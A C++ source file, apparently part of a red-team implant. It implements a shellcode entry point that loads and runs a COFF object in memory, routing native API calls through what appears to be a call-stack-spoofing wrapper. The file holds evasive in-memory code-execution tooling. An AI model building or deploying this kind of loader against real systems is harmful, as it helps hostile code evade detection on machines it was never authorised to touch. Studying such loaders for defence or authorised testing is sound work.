#include <windows.h>

#include "Native.h"
#include "Prototypes.h"
#include "Hash.h"
#include "Instance.h"
#include "Macros.h"

D_SEC(C)
bool ShellcodeEntry(
    _In_    PVOID       pCoffContent,
    _In_    DWORD       dwCoffSize
)
{
    COFF_LOADER_CONTEXT     CoffContext = { 0 };

    CoffContext.hHeap = (HANDLE)DRAUGR_API(RtlCreateHeap, HEAP_GROWABLE, NULL, 0, 0, NULL, NULL);
    if (!CoffContext.hHeap) {
        return false;
    }


    if(!
        InitializeCoffContext(&CoffContext, pCoffContent, dwCoffSize)
    )
    {
        FreeCoffContext(&CoffContext);
        return false;
    }

    if(!
        AllocateMemorySection(&CoffContext)
    )
    {
        FreeCoffContext(&CoffContext);
        return false;
    }

    if(!
        LoadAndResolveSymbols(&CoffContext)
    )
    {
        FreeCoffContext(&CoffContext);
        return false;
    }

    if(!
        ApplyRelocations(&CoffContext)
    )
    {
        FreeCoffContext(&CoffContext);
        return false;
    }

    if(!
        ApplyMemoryProtection(&CoffContext)
    )
    {
        FreeCoffContext(&CoffContext);
        return false;
    }

    COFF_INFO CoffInfo;
    _memset(&CoffInfo, 0, sizeof(COFF_INFO));
    CoffInfo.MemoryStartAddress =   (void*)GetShellcodeStart();
    CoffInfo.MemoryEndAddress =     (void*)(U_PTR(CoffInfo.MemoryStartAddress) + SHELLCODE_SIZE);
    CoffInfo.CoffStartAddress =     (void*)(reinterpret_cast<UINT_PTR>(GetShellcodeEnd()) + sizeof(DWORD));
    CoffInfo.MemorySize     =       TOTAL_SIZE;
    CoffInfo.CoffSize   = COFF_SIZE;

    GLOBAL_INSTANCE->CoffInfo.Heap = (PVOID)DRAUGR_API(RtlCreateHeap, HEAP_GROWABLE, NULL, 0, 0, NULL, NULL);

    if(!
        ExecuteEntryPoint(&CoffContext, (void*)&CoffInfo)
    )
    {
        FreeCoffContext(&CoffContext);
        return false;
    }

    DRAUGR_API(RtlDestroyHeap, GLOBAL_INSTANCE->CoffInfo.Heap);

    FreeCoffContext(&CoffContext);

    return true;
}

